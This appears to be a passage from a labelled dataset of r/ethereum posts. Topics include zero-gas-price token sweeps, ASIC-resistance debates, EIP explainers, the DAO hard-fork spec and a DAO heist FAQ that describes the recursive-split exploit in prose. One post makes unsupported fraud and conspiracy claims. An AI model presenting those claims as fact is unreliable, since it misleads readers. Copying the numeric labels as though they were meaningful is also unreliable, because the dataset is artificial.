token transfer because it's gone nearly as fast as it arrives - usually within two blocks. it's fascinating to see some money locked in the blockchain not because of an address mistake (which is a fairly regular occurrence), but because of the collective actions of a bunch of people interacting with the chain. ## a minereum mystery so i check this account relatively frequently to see how the various players are doing and the other day i was surprised to notice that some of the minereum that i thought was locked in this account was leaving this account and headed to 957, like this one: [ethereum transaction 0xb1050b324f02e9a0112e0ec052b57013c16156301fa7c894ebf2f80ac351ac22](https://etherscan.io/tx/0xb1050b324f02e9a0112e0ec052b57013c16156301fa7c894ebf2f80ac351ac22) this was immediately interesting as this minereum was supposed to be untouchable in this account. how was 957 removing it? it wasn't immediately clear but it appears that 957 had submitted a few transactions with a normal gas limit but zero gas price, meaning there's zero tx gas cost and the transfer can be included in blocks even though there's no gas to pay for it. but since there's no gas associated with the transaction, there's no conceivable reason why a miner would include such a transaction in one of their mined blocks. you might know this if you've tried to buy or interact with a cryptokitty recently and your gas price was set too low - you probably wait a long time for your transaction to be included. but these zero gas price transactions were being included immediately in a block. that was fascinating - how did these transactions get included in the chain? ## sweeps become miners the mystery started to reveal itself when i realized that all of these zero gas price transactions have been included in blocks mined by 0xe4e359702a4ab1f9c7b2f1a4da8064492ec1d41a, a miner that has been operating for the last 11 days: https://etherscan.io/address/0xe4e359702a4ab1f9c7b2f1a4da8064492ec1d41a#mine presumably 957 had the brilliant idea that they could include whatever transactions they wanted if they only had access to a mining pool. and with $23m in the bank, why not buy your own pool? there are payments made to genesis from this account so it seems reasonable that this is paying for a cloud miner but i'm not familiar enough with the setups of cloud miners to understand how one can decide to include zero gas price transactions in their own. so 957 waits for their gpus to mine a block, and immediately adds ~5 zero gas price transactions to the normal selection of txpool transactions picked up by their node, sweeping tokens to the 957 account and submitting it normally. 957 also uses this opportunity to move funds out of accounts where the balance is low enough that it doesn't make sense to pay a tx fee to move that low amount otherwise. yes, it might not be worth it for a single transaction, but if you've got enough of these accounts with $5 in them then it can accumulate over time and add up to real money. or at least they think so. here's one of these low value with zero gas price transactions: [ethereum transaction 0x9506fc85ab3836744025a41dfe66076d53a10d70b9f2008cbfc4eb1bbb393820](https://etherscan.io/tx/0x9506fc85ab3836744025a41dfe66076d53a10d70b9f2008cbfc4eb1bbb393820) cloud mining may be barely break even normally, but with the extra bonus of trapped tokens and these accounts with very low amounts on top, paying someone to host hardware to mine ethereum might actually be worth it for 957. --- i find these sorts of meta-games inside of a system that isn't designed specifically for them very interesting, and after watching for a while i finally felt like i had enough information to put something together describing what's going on. i'll keep watching, of course, for continuing developments. there are still a lot of interesting angles to explore here. here are some of the questions i still have about the process. if you've got theories, please chime in! * why does 957 make these tiny transactions to pull 3 minereum at a time from these accounts with no gas price? could they not include all 30k minereum at once from accounts like this: https://etherscan.io/address/0x5b5b9f1cbc0062c61ab73577e02301c07f5b66fa#tokentxns * i've never seen anyone sweep any ether away in less than two blocks time, i.e. eth is sent as part of block 4700000 and then is taken in a tx as part of block 4700002. i'm guessing that there's something about the details of how the txpool works that prevents this from happening in one block but i'd be curious to know what that actually is. * zero gas price is a weird thing for the network to tolerate - does this make sense in some cases or is this something that should be disallowed on the network?	1

just in a recent discussion i figured out some people might print keys with printers. they are know to have weak security! also some save documents for a while. please do not trust a printer - especially not with important private keys! to generate a paper-wallet it is imho best to generate seed words with some offline computing device and then write them down with a pen - or etch them or whatever - but please think twice before using a printer for this job..	1
**intro:** i am hoping that a community here can vote this up so the problem reaches the core and wider community members and can be given a higher priority. it looks like most people are not aware of this being a major issue as such. i represent an engineering team of 14 people and for the last couple of years we have been heavily buidling on a full time basis. we are ideologically inclined to build applications that are truly decentralized. the key parameter for us is to have apps that can independently verify the state of blockchain and can’t be controlled, censored or blocked. **the problem:** we build decentralised apps so i will take one such app as an example. in a context of crypto wallet mobile app it’s possible to have the above criteria met for the bitcoin, bitcoin cash, dash and many other bitcoin forks but not for the ethereum just yet. the main issue is that there are just way too few ethereum nodes that are eager to serve the spv enabled clients. a decentralized app (is an spv client) needs to be able to validate the state it receives from the blockchain rather than trust some middle man (ex: [infura.io](http://infura.io/)). as there are way too few nodes an spv-enabled app is not able to synchronize with and validate the state of the blockchain within the acceptable time duration. it's a serious problem for mobile devs who are trying (will try) to build truly decentralised apps because a mobile app has an average session of just a few minutes. we have built a wallet app that has an spv mode for btc, bch, dash and eth. and while the code for eth (known as les client) is in place it simply doesn't work in a practical sense. in the next release we are deliberately going to encourage users not to enable les mode because the app will take several days if not more to sync with the eth blockchain while for all other blockchains it's a matter of a few hours. the sync time is significantly faster on those blockchains as there are plenty of nodes that are always online and available to serve the spv client. as a community we can not expect to see decentralised apps built on top of ethereum before this problem is addressed. an app which doesn't work in a decentralised manner is not censorship resistant and is prone to manipulation. **potential solution:** a temporary fix that should significantly improve the current state of affairs is if the less protocol setting on the geth node enabled by default. this would surely make things harder for miners. an alternative option would be to get something similar to [https://vipnode.org](https://vipnode.org) peace!

(i have archives no worries) second they deleted op (check https://i.imgur.com/26obf8q.jpg or https://web.archive.org/web/20180915123751/https://www.reddit.com/r/ethereum/comments/9fyldx/breaking_news_new_asic_with_737x_efficiency_of_e3/) third they put it back on, figured they will upset community. still gone from frontpage stop fucking with the ethereum community with your hidden agenda and if this was *proven* to be removed by accident (hard to imagine) then i'll take all that back and will say sorry. ###################################### **breaking news** **the beast is announced.** [https://www.coindesk.com/a-new-line-of-powerful-asic-miners-is-coming-to-ethereum](https://www.coindesk.com/a-new-line-of-powerful-asic-miners-is-coming-to-ethereum/) just as i have said many times before, when they fear their hardware becoming worthless, which an ethereum asic-fork-off would do, they will try anything to get asics to the masses. now what would you do if you have developped an asic 62.2x more efficient than bitmain's and you feel a sentiment becoming stronger in the ethereum community (to fork asics off)? **exactly** i would put out a pr right then and there saying i will release a 62.2x more efficient asic miner to the market in the beginning of the next year. this way they can kill 2 birds with one stone: 1. put bitmain, their competitor, under massive pressure, who will now firesale their asics, getting asics to the masses. 2. getting asics to the masses prevents ethereum to fork because community doesn't want to when they own asics. this protects their hardware. do you believe an asic ~~7.37x~~ 62.2x more efficient than the e3 isn't long mining on the network? if that doesn't make eth devs fork, we definitely know they have a hidden agenda and that \[tinfoil hat on\] maybe some of the devs are compromised by bitmain/other asic manufacturers. this is a **multi b economy** after all. \[tinfoil hat off\] asic manufacturers are systemically exploiting and straight out scamming consumers out of their hard-earned money, the best case would be the new zcash miners, let me lay it out for you: \- in june a zmaster a9 had a price of 10,000 and a break even time of around 70-80 days. \- in july/august zmaster a9 had a price of 5000-6000 and a break even time of around 70-80 days \- in september zmaster a9 had a price of 3000-4000 and a break even time of around 70-80 days personal prediction: \- in october-november zmaster will be 1500-2000 and will have a break even time of around 70-80 days note: the ones who bought the zmaster a9 in june still haven't broken even. do you see the pattern? first they pre-mine, then they manufacture their second gen, then they sell their miners in a very shady way laid out above. once they sold them they crush difficulty slowly and will soon release their ""zmaster a9 grande"" and will do the whole thing over. each time milking the miner community, as many people are naive and buying into this shady scheme, blinded by break even times which mostly only last 2-3 weeks. nvidia and amd are not doing this because 1. they are reputable decades old public companies that haven't their core business in crypto **at all** 2. they would get sued immediately for running a fraudulent scheme conclusion: **if eth doesn't fork asics off they are the enabler that allows small time miners to get scammed by asic manufacturers. i wonder how they can square that with their conscience.** *edit: check (for example)* [*https://www.youtube.com/watch?v=q52cepi1dd8*](https://www.youtube.com/watch?v=q52cepi1dd8) *and this isn't just about one manufacturer, i already was interested in mining back in 2012/2013 and i did mine a little with my gpu and i wanted to get myself an asic. back then you would order in march and get your product in november, by that time a more efficient asic would have been on the market and youd be delivered a couple thousand dollar brick to your doorstep. it's gotten a little better but the manufacturers will continue this until there's real world-wide competition. we got another couple years until that happens. so asics are bad as of this moment, not because asics are bad themselves, but without exception all manufacturers are. you can't even hold them accountable since all are in china and all of them state on their websites that they don't do refunds.* *so just fork it and be done with this discussion, it's obvious to everyone what has to be done. if monero and others can do it i'm sure you can too.* >at present, the **company is still working on developing the product**. customers may begin receiving their miners in april 2019, according to the presentation. if anyone believes that i'm sorry to tell you: you're straight out stupid or the most naive person i have ever met."	1

i'm noticing that a lot of people have similar questions about constantinople. i answered a lot of constantinople questions in [one comment](https://www.reddit.com/r/ethereum/comments/absmqx/eli5_constantinople_speed_confirmation_etc/ed320i0), but i'm sure some redditors will miss my comment before asking the same questions. if any of these bullet points are wrong or inaccurate, please let me know so i can update them! * [**quick video that describes 4 of the 5 eip updates**](https://www.youtube.com/watch?v=rfg408lsaj0) * **the video was released before the ethereum foundation added a 5th eip to the update,** [**eip-1283**](https://github.com/ethereum/eips/blob/master/eips/eip-1283.md)**.** * [**progress tracker used for constantinople**](https://github.com/ethereum/pm/wiki/constantinople-progress-tracker)**. this is a great resource if you're looking to learn about the eip's on a technical level.** * **transaction/confirmation time?** * block time should stay \~15 secs. full pos may change that, but with pow there's some latency involved and a faster transaction speed may create blocks with unreliable transactions. [eth currently uses uncle blocks to deal with this.](https://forum.ethereum.org/discussion/2262/eli5-whats-an-uncle-in-ethereum-mining) * **cost of transaction?** * cost depends on the quantity of transactions. some of the eip's will optimize smart contract interactions, so hopefully the cost of transacting with a smart contract will decrease. however, we don't know if another dapp like cryptokitties will show up, congesting the network and increasing fees. * **number of transactions/second?** * [https://www.reddit.com/r/ethereum/comments/9edwkk/how\_many\_transactions\_per\_second\_will\_we\_have/](https://www.reddit.com/r/ethereum/comments/9edwkk/how_many_transactions_per_second_will_we_have/) * tldr; there will be the same average tx's/second, but with how eip-1024 will optimize state channels, we should see some second-layer solutions starting to come into play (think omisego, loom network, raiden, etc.) * **pos instead of pow?** * not yet, there's a lot of testing still going on with this. one of the reasons of eip-1234 is to reduce block rewards in order to delay the difficulty bomb. [eventually, we'll have a beacon chain and sharding chains](https://www.mangoresearch.co/ethereum-casper-v2-beacon-chain-sharding-explained-simply/) * **a new crypto? or just an upgrade?** * this is a hard fork and will create a new, second eth blockchain including the eip implementations. however, this should not be a contentious hard fork and we're assuming miners will switch to the new chain. all of the current smart contracts on the current eth blockchain will be replicated on the new chain. the old eth blockchain may hold some value while miners take their time to switch to mining the new chain. however, there will be no more planned updates for the first blockchain, which should eventually push the original eth blockchain close to $0.	1
i understand the optimisms on ethereum future. but like vitalik himself said ethereum is an experiment as of now. in what case, could eth loose the interest of the public n no longer hold any significant values? would it likely be issues regarding to consensuses, scal or sth else?	2
a friendly reminder. /r/ethereum is about to receive a whole bunch of exposure with the homestead release this upcoming monday. this subreddit will most likely experience a sharp influx of users *completely* new to the ethereum ecosystem in the days/weeks/months to come. without doubt, plenty of duplicate questions are going to be submitted that (with some effort) could have been answered independently via searching and some technical ability. however, **it is in our best interest as a community** not to shrug off our newest members with vague, link-only responses, sarcasm, or nonconstructive criticism. if a question bothers you (and your response isn't friendly), please just move on. let's not flame participants for wanting to know more. for many, this is going to be their *first* direct experience with ethereum and this awesome subreddit. let's be patient, let's keep in mind how complex ethereum can appear from the beginning, and let's leave a good first impression.	2
"**i am speaking on behalf of myself, hudson jameson, and not on behalf of the ethereum foundation or any other entity. however, i am a lawyer/doctor and this post is both medical and legal advice. just kidding, it isn't.** hey all! i've been closely following the debate that has been happening across social media and chat channels the past 2 weeks regarding the possibility of designing and implementing a new asic resistant proof-of-work algorithm. the debate is over whether or not we should hard fork the ethereum network in order to prevent asic miners from operating. i am in the unique position of organizing and running the bi-weekly core developer meetings and have been active in the ecosystem for a while. i want to make sure both sides feel like they are heard. this post is meant to provide context and offer next steps for both sides of the argument. ## facts - it is confirmed that an asic miner able to mine the ethash algorithm [has been developed](https://shop.bitmain.com/product/detail?pid=00020180407155628542kh79qu7m0649). - about 2 weeks an [eip](http://eips.ethereum.org/) was created by piper merriam called ""[eip 958: modify block mining to be asic resistant.](https://github.com/ethereum/eips/pull/958)"". piper opened the eip intending for it to be a starting point for both technical and non-technical discussion about asic resistant algorithm changes. his role in the eip is to act as a neutral facilitator and not as an expert. the eip is now closed at the request of the author. discussion has continued in other forums such as reddit. - about a week ago, airsquirrels created ""[eip 969: early asic mitigation hardfork.](https://github.com/ethereum/eips/pull/969)"". this eip is focused on technical discussion around an asic resistant hard fork. it has been merged in the eip respository in draft status in accordance with eip 1. this does not indicate that the eip is agreed upon or accepted, but that it meets the minimum technical requirements based on the eip x template to be merged as a file into the repository. - veox has been working on cleaning up eip 969 from a grammatical and technical standpoint. the status of that eip pr can be found [here](https://github.com/ethereum/eips/pull/979). - eip 958 was a topic of discussion at [the most recent core developer meeting](https://github.com/ethereum/pm/issues/36). the notes from the meeting and a link to a video recording of the meeting can be [found here](https://github.com/ethereum/pm/blob/master/all%20core%20devs%20meetings/meeting%2036.md). **this next section is my best effort at summarizing the arguments from both sides. i am numbering them to make it easier to reference a specific argument for or against.** ### pro asic resistance (par) there are 2 great resources that provide more detail to these bullet points. 1. [medium article - why ethereum should adjust algo on next planned hardfork? from a miner’s perspective](https://medium.com/@bitsbetrippin/why-ethereum-should-adjust-algo-on-next-planned-hardfork-from-a-miners-perspective-aa0afeef05b9) by /u/bitsbetrippin. 2. [/r/ethermining thread - regarding threads on bitmain and asic resistance (mega thread!)] (https://www.reddit.com/r/ethermining/comments/8auy55/regarding_threads_on_bitmain_and_asic_resistance/) by /u/robbbbbbbbb. - par 1: it is a security risk that asics are allowed to exist on the ethereum network. with one entity having a majority of the hashing power, 51% attacks are a real possibility. - par 2: the ethereum white paper declared that ethereum was built to be ""asic resistant"", at least from the perspective of being resistant to economic incentives to produce asics. if this wasn't a false narrative it needs to be upheld. - par 3: bitmain being allowed to mine using asics on the network would cause increased centralization in ethereum. - par 4: bitmain may have a better asic that they have not revealed that they are using to mine the network currently. this amplifies the other risks and eliminates some of the uncertainties around how much of an improvement ethash asics are compared to gpu mining if true. - par 5: bitmain has been proven to be hostile to cryptocurrency groups. this can be shown by their hostility to bitcoin when they got involved in bitcoin cash. their business practices are not altruistic in any way. - par 6: after monero forked to prevent asics their hash power dropped 70%+ which proves that asics were secretly mining on their network. the same could be happening to ethereum today which is why we need to act quickly. - par 7: asics would eliminate hobbyist miners and make it difficult for the average jane to mine ethereum. ### pro doing nothing (pdn) there are 2 great resources that provide more detail to these bullet points. 1. [blog post - anti-asic forks considered harmful](https://pdaian.com/blog/anti-asic-forks-considered-harmful/) by [phil daian](https://twitter.com/phildaian?lang=en). 2. [ethereum core developer meeting #36 notes/video](https://github.com/ethereum/pm/blob/master/all%20core%20devs%20meetings/meeting%2036.md). arguments described in the recent core developer meeting have a timestamp linking to the video. - pdn 1: the efficiency gains accomplished by the asic is relatively limited. at the time this comment was made on the code devs call, batch 1 of the bitmain asic's sold for $800 for 180mh/s which is a 2.5x factor improvement over gpus. batch 2 now sells for $1,800, but the argument can still technically be made, albeit with a different improvement level. [(35:38)](https://youtu.be/sopfonpqg0k) - pdn 2: we are unsure what protocol changes would make a difference. even if we switch to a pow algorithm that is entirely different and not i/o bound at all, such as sha3, it may only buy us 6-12 months. [(37:37)](https://youtu.be/sopfonpqg0k?t=2257) - pdn 3: the development effort to change the pow algorithm and getting everyone to upgrade would be chaotic and risky. developing, testing, planning, and enacting a hard fork and related code is not a simple process. [(38:47)](https://youtu.be/sopfonpqg0k?t=2327) - pdn 4: focusing on changing the pow algorithm would detract from more important things, such as casper, sharding, and other protocol level work. [(38:47)](https://youtu.be/sopfonpqg0k?t=2327) - pdn 5: the ethereum network is switching to proof-of-stake (casper) soon™ so changing the pow algorithm detracts from the research and development. changing the pow algorithm would serves as a band-aid while casper is both an eventuality and a permanent solution. - pdn 6: the worst case scenario is that bitmain controls a large portion of the ethereum network for some time. if they try to use it for malicious purposes, casper development can be sped up, launched in a week (albeit with potentially more bugs and skipping formal verification/academic review), and mining rewards would go down by 90%. if geth and parity start making it a higher priority to implement casper it would provide us with some insurance in the case of a 51% attack.[(39:05)](https://youtu.be/sopfonpqg0k?t=2345) - pdn 7: it is impossible to prevent anti-competitive economies of scale from forming around mining. large corporations and entities will achieve economies of scale in any mining model, including general purpose hardware / gpu-dominated mining (see [phil's blog](https://pdaian.com/blog/anti-asic-forks-considered-harmful/) i previously referenced). - pdn 8: anti-asic forks reduce the cost to attack a cryptocurrency substantially and are a good thing for the security of a cryptocurrency system (see [phil's blog](https://pdaian.com/blog/anti-asic-forks-considered-harmful/) i previously referenced). ## how long until casper is launched? this seems to be a sticking point in many of the arguments. here is the latest: researchers are in the process of finalizing the code for the 2nd stage of the testnet with the goal of completing and freezing the full specification of the casper pos algorithm. geth and parity could start implementing parts of the casper today. casper is currently being formally verified by runtime verification which should take another 4-5 months to complete. multiple academic groups are also looking at casper. a formal eip on casper is being worked on and will be released for review in the next 2 weeks. the plan is to have runtime verification formally verify casper, relaunch a custom casper testnet with specs from the eip, relaunch the contract on an ethereum testnet, and finally launch casper on the mainnet. there is no official timeline and there is unlikely to be one, in my opinion, until we get much closer to casper being formally verified. [(40:23)](https://youtu.be/sopfonpqg0k?t=2423) ## so what now? well i for one am going to make myself a whiskey. not because this was stressful, but because i enjoy whiskey. i actually find this pretty fun. anyways, if you are in the par group i suggest you act on your convictions and help with some of the eips being produced. if you are in the pdn group you can provide counter-arguments to the par group in forums/chat rooms. currently the rough consensus of ethereum core developers is that of the pdn group. however, my experience is that they are open to whatever the community wants as long as community consensus, or something close to it, can be demonstrated. there are many ways to determine this, including voting and discussions and eips. i encourage everyone to participate in this process. ## you said a thing wrong! if you feel like i left off an argument or made a mistake in this post let me know in the comments. i'll track edits at the bottom of this post. later!"	1
**update**: _thanks guys! this was a lot of fun. if you are late to the party, [we compiled all the highlights from this ama on our blog](http://bit.ly/loomamahighlights) so you can catch up easily. let's do this again sometime! 😊 — james_ hi ethereum community! my name is james duffy ([proof](https://i.imgur.com/l1m73ql.jpg)) and i’m the co-founder of [loom network](https://loomx.io/). we’re building a layer 2 solution to help ethereum scale. our [developer sdk](https://medium.com/loom-network/loom-network-sdk-alpha-release-first-5-dappchains-announced-sdk-roadmap-1dddec789004) will be released next month, and allows dapps to be built on highly scalable dpos sidechains, secured by [plasma cash](https://medium.com/loom-network/loom-network-plasma-5e86caaadef2) on mainnet. this enables a new class of dapps that require a high very throughput (like online games), while still providing the security guarantees of ethereum for tokenized assets. in short, you can think of loom network as bringing eos-like functionality to ethereum. we’re also the makers of [cryptozombies.io](https://cryptozombies.io) — a fun, interactive “code school” where you learn to build ethereum dapps by making your own zombie game. we are super proud to have helped almost 200,000 developers learn ethereum development using cryptozombies to date. if you’ve never heard of loom before, [this post](https://medium.com/loom-network/everything-you-need-to-know-about-loom-network-all-in-one-place-updated-regularly-64742bd839fe) might be helpful. i, along with others from our dev team (like my co-founder /u/mcampbell42), would be more than happy to answer any questions you might have about ethereum scalability, plasma cash, dapp development, and the projects we are working on at loom. p.s: already asked permission from mods (/u/avsa) about this.	0
a few months ago i [posted](https://www.reddit.com/r/ethereum/comments/7lhm81/any_interest_in_an_ethereumtycoon_game_where_you/) about a prototype of a dapp where you can earn eth by buying and selling (flipping) virtual real estate. after some detours, and spending way too much time on details like 3d modeling, furniture, finishes, and art styles, it finally looks to be coming together more or less. [screenshots on imgur](https://imgur.com/a/fva09wk) currently i'm looking for some beta testers. since this is a 3d app, a decent gaming desktop rig would be good to have. the dapp is currently running on the ropsten test chain, so its still completely free. the dapp/game works as follows: 1. grow your real estate portfolio by buying lots. the price depends on the lot size and if there is a house already. 2. design a house in the sims style, or improve the house if the lot already had one (or raze and start over). designing is completely free and you can destroy and rebuild unlimitedly without having to sign any metamask transaction. 3. once you want to sell one or more of your properties, you'll have to pay a fee for the final structure, depending on its size/furniture/vehicles. 4. then you can sell (flip) the property for your chosen price. the number of plots is quite limited which creates scarcety. 5. if you just like to design houses, you only have to buy one empty lot of land, and you'll never have any other costs since building is free until you want to sell your house. [game guide and screenshots here](https://www.ethtycoon.app/) anyone that liked building houses in the sims and has a decent gfx card can be beta tester :) ^edit: ^[subreddit](https://www.reddit.com/r/ethereopolis/) ^for ^beta ^feedback.	1
i'll attempt to explain the first [metropolis hard fork changes](https://blog.ethereum.org/2017/09/14/geth-1-7-megara/) in a way i can understand them myself. since i'm not a low level core dev, i hope this can be useful for others. i welcome any comments or corrections: #### eip 98: removal of intermediate state roots from receipts (#14750). this allows more parallelization on transaction processing, as not all transactions require the result of the previous one. #### expanded by eip 658: embedding transaction return data in receipts (#15014). this allows light clients to be able to see if a call they made was executed properly or if it failed. this could only be verified by full nodes previously. #### eip 100: change difficulty adjustment to target mean block time including uncles (#14733). in bitcoin, only miners who found a block and sucessfully added it to the main chain received block rewards. this leads some ineffiency and some miner centralization as miners who were physically close had an advantadge and wasted work so ethereum created the uncle reward, in which if you found a correct block but it lost the race to reach all other miners, you would still get paid. but this led to an error in which the total issuance was slightly higher than the expected 5 ether per block in an unpredictable way: during moments where internet connectivity lagged or the network was too busy, more uncles would mean more ether was created. this eip fixes that. #### eip 198, eip 212 (197) and eip 213 (196): precompiled contracts for modular exponentiation; elliptic curve addition, scalar multiplication and pairing (#14959, #14993). adds some cryptographic primitives that enable some new use cases, mostly around zk-snarks. this indirectly enables new novel uses, including higher privacy, scalability and other stuff people will come up with. #### eip 214 (116): expanding the evm with static contract calls (#14978). whenever a contract calls another contract in the middle of their function, that contract takes priority and can then do anything it wants, including calling the original contract back. this creates some complicated situations that makes writing smart contract more complex as there are tons of ways in which your contract state might have changed after that call in which you can't predict (the dao bug, for instance). this creates a safer way to call an unknown contract from inside your contract. #### eip 211: expanding the evm with dynamically sized return data (#14981). **explanation from /u/izqui9** at the moment when you make a call to another contract you must specify how many bytes of return data will be copied. eip 211 introduces two new opcodes returndatasize and returndatacopy. after making a call you can check how many bytes the call returned and then copy exactly that many bytes. this is specially exciting as it will enable forwarding contracts to return exactly what the underlying call returned. right now forwarding contracts rely on hardcoding how much memory they will read from the call, but this is not a good solution for dynamic sized types such as strings or bytes array that can have an arbitrary size. #### eip 206 (140): expanding the evm with cheap state revertals (#14983). in almost any contract you usually want to check multiple situations that would prevent a transaction from being executed: maybe the caller is not authorized to do that transaction (not the owner!) or maybe the contract is not yet on a state in which it can do that (crowdsale has not started) or some other limit (participation cap is reached!). when that happens you want all execution to stop and no state to change so you execute a `throw` function. the issue is that is an expensive call: it burns all the gas sent and doesn't provide the user any way to tell the reason it failed. this introduces a better way to do it: by using revert instead of throw, you only spend the gas the user actually used, and it provides a useful error code telling the user *why* their transaction failed. super useful for app development! #### eip 649: delaying the difficulty bomb and reducing the block reward (#15028). self explanatory: delays the iceage by 18 extra months and reduces block reward to 3 ether in preparation for future pos reduction. #### eip 684: preventing overwriting contracts (byzantium prep) (#15039). byzantium will change the way in which contract addresses are created. this prepares to prevent collisions, by preventing contracts from being deployed where there's another one existing.	1

"i am a core developer of pascalcoin (www.pascalcoin.org) and i am posting this here reaching out for assistance from the ethereum community. we are a proof-of-work coin, 100% original and offering innovative approach for scaling. we have introduced a new cryptographic data-structure known as the safebox that allows us to delete the blockchain after 100 blocks whilst retaining spv security of entire chain. we have already achieved 140+ txn/sec on the mainchain and have, in my opinion, a genuine value proposition for this sector. i am only stating this to prove we are not just some ""clone-coin"" or ""scam-coin"" when compared to other coins with higher marketcap. we believe we have a solid value proposition. all good and great, except we have an interesting economic problem being ""caused"" by ethereum miners. since we are gpu-friendly pow currency, it has made us a prime candidate for dual-mining by the ethereum-centric nanopool. the introduction of dual-mining has fundamentally changed the economics and incentives of mining for the ""secondary coin"". let me explain. ordinarily, a coins mining eco-system grows organically with interest and centralisation does not occur. this is due to the *""hashpower follows price""* law. as price grows organically due to interest, so do the number of miners. if there are too many miners, the coin becomes unprofitable, and some miners leave. this homeostasis between mining, price and eco-system size seems to be part of the magic of satoshi's miracle economic innovation. with dual-mining, **this is broken**. dual-mining has led to coins with small user-base to have totally disproportionate number of miners who mine the coin even when ""unprofitable"". in our case, miners are primarily on nanopool to mine ethereum, not pascalcoin. so the number of pascalcoin miners are a function of ethereum's ecosystem, not pascalcoin's eco-system. also, these miners mine pascalcoin because they have latent computing power, so it technically costs them nothing to mine pascalcoin. this obviously changes the economics! this has resulted in a 99% mining centralisation in nanopool, yet they are not malicious at all. due to this centralisation, several exchanges have paused their integration of pascalcoin because of the theoretical threat posed by this centralisation. this has blocked our growth. so now we have a situation where miners are actually hurting the coin and it's value, yet their hashpower is increasing. anyway, enough with the problem. the solution i've come up with is to embrace dual-mining rather than fight it. this means we need *more* ethereum pools to offer dual-mining pascalcoin, that way we can balance out the distribution. this is where you can help. can you please help put me in contact with pool operators. either pm me a contact person or forward them this post. i am prepared to pay good money to offset the integration costs. i am particularly interested in the following pools: f2pool, ethermine, ethfans, miningpoolhub, bitclubpool, dwarfpool, bw, ethpool. thanks for taking the time to read this and assisting if you can."	1
1) the implementation has been largely spec-frozen to the following python: # call before running transactions def initialize(): if state.block_number == dao_hardfork_blknum: for acct in hardfork_dao_list: state.set_balance(hardfork_dest, state.get_balance(acct) + state.get_balance(hardfork_dest)) state.set_balance(acct, 0) however, the dev community is debating the simplest way to minimize risks of issues related to light client syncing. the actual logic that allows dao token holders to claim their ether would be implemented in `hardfork_dest`. 2) the ether claiming logic is largely a simple withdrawable token contract, but small details are being debated regarding how to deal with secondary daos, legit splits, etc. note that this can proceed in parallel to (1), there are no sequential dependencies. simplicity of the ether claiming contract is understood to be a very important concern. 3) note that the above should absolutely not be taken as an official endorsement of hardforking by either the foundation, or ethcore/slock/string, or the individual devs involved; some of the devs involved are pro-fork and some are anti-fork, **the goal is to give the community a choice**.	0
"the big thedao heist faq **what happened?** 3,641,694 eth where splitted out of thedao. the attacker found a loophole in the regular splitdao function so that they could reuse the same dao tokens over and over again. **how did the attack worked exactly?** the attacker managed to combine 2 exploits. the first exploit was to call the split dao function recursively. that means the first regular call would trigger a second (irregular) call of the function and the second call would trigger another call and so on. the following calls are done in a state before the balance of the attacker is set back to 0. this allowed the attacker to split 20 times (have to look up the exact number) per transaction. he could not do more - otherwise the transactions would have gotten too big and eventually would have reached the block limite. this attack would already have been painful. however - what made it really painful is that the attacked managed to replicate this attack from the same two addresses with the same tokens over and over again (roughly 250 times from 2 addresses each). so the attacker found a second exploit that allowed to split without destroying the tokens in the main dao. they managed to transfer the tokens away before they get sent to address 0x0 and only after this they are sent back) the combination of both attacks multiplied the effect. attack one on its one would have been very capital intensive (you need to bring up 1/20 of the stolen amount upfront) - the attack two would have taken a long time. **is the remaining ether in thedao safe?** no - it is most likely that this exploit could have been used to drain all ether out of thedao. the attacker stopped draining eth when vitalik wrote his first blog response that mentioned the plan for soft and hard forks. we can assume that the hacker stopped for strategic reasons to make a community decision for a fork less likely. however - the attacked voted in other fork proposals as well - for more details have a look [here](http://imgh.us/the_attack_graph_03.svg) **update 06/21:** *another comment - in the case that the execution of some fork is announced it will take some time to activate this fork. in this case i think it is very likely that we will see more attacks on the dao - not unlikely that all eth will be drained. in this case: do not panic. this would be expected and there are options to restore all eth.* **since the ether of the attacker is in a copy of a thedao contract - can the eth be stolen the same way?** this would have been possible if at least one honest actor would have voted for this split. since the attacker is most likely the only shareholder and the curator of this dao the same attack can not be done. **update 06/20:** *lefteris karapetsas found out a way how to enter the ""darkdao"" - this allows indeed to counter attack the ""darkdao"" and all other potential thefts. this means that all eth can be restored with soft forks only - read more [here](https://www.reddit.com/r/ethereum/comments/4ov5yi/all_eth_can_be_restored_with_soft_forks_only/)* **how would the proposed soft fork work?** the soft fork would be an immediate action to mainly buy time. miners could modify the ethereum client that it would ignore all transactions where as a result of the transaction eth is deducted from an address that has the code of thedao. miners would also ignore blocks of other miners that would include such a transaction. if the majority of miners decides to do so it would be impossible for everyone to move eth from every ""thedao"" version. so it would affect the main ""thedao"" and all the splits - including the regular and the malicious one. **is a software version of eth with this modification already available?** yes - parity and geth have released proper versions. **what needs to happen to activate the soft fork?** it would require a coordinated effort of the majority of the miners. coordination is important otherwise a miner would likely lose his eth. if you for example solo mine you should not switch to the patched version unless you are convinced that a majority of the miners did because otherwise your software will ignore the longest chain since it would see it as invalid. miners need to communicate with each other and define a block in the future that should be used to switch over to the new version. as soon as the majority accepts a new version it is dangerous for a miner not to use the new version. **if the soft fork succeeds - what is a path forward** the softfork will most likely only a temporary solution. if it would be the final solution it would mean that basically all eth on all thedao contracts is frozen forever. there are two more likely paths forward. first a hard fork - with a hard fork literally everything is possible - we will discuss likely paths later. the second path from the freez softfork is to allow only certain kind of transactions. under the assumption that no more eth is drained from thedao a more specific softfork 2 could allow every dth to receive its share of the remaining eth. **if the soft fork does not succeed - what will happen?** a very big mess of attacks and counter attacks. white and black heat hacker will start exploiting this bug. however since every split will be public everyone can join every split. the right strategy would be to split you tokens up to have a very small number of tokens in every split. so if someone is performing the attack others will also have shares in the splitted dao - that will allow them later to perform this attack again in the newdao after the creation period is over. this could result in endless splitting. it would create incentives to spam the network or to bribe miners to censor transactions. in addition it is very likely that other bugs will be found and exploited. if we would end up in this stage it is very likely that all non technical dth would lose everything. **what are the arguments for and against the soft fork?** the biggest argument for the soft fork is the prevention of the huge mess that would occur without one. there are philosophical arguments against it - essentially the softfork would be a form of censorship. however - most affected by this censorship would highly welcome it (all dao token holder) expect the attacker. however - there is a small group of people also affected by this who not might want it - everyone who spitted in a regular manner and is confident that no one of the other shareholder in this splitted dao will atack them (e.g. because they are the only one). **when and how is a hard fork possible?** a hard fork would require longer discussion and consensus finding. to execute a hard fork miners are less important. more important are exchanges and key player in the ecosystem. (ethereum foundation, core developers, leading companies in the ecosystem). if all those players agree to a hard fork even a small minority of miners would be enough but more importantly - miners would join under those conditions almost for sure. with a hard fork in principal all rule changes are possible. new ether can be created, legit eth can be destroyed and so on. however - chances are 0 that the community would agree on such a fork. so we can narrow the expected range down. on the upper end (on a scale of eth value per dao-token) would be a complete reversion of all illegitimate splits. that would mean that dao tokens could again be redeemable of 0.01eth each. the lower end would be the ratio of eth that 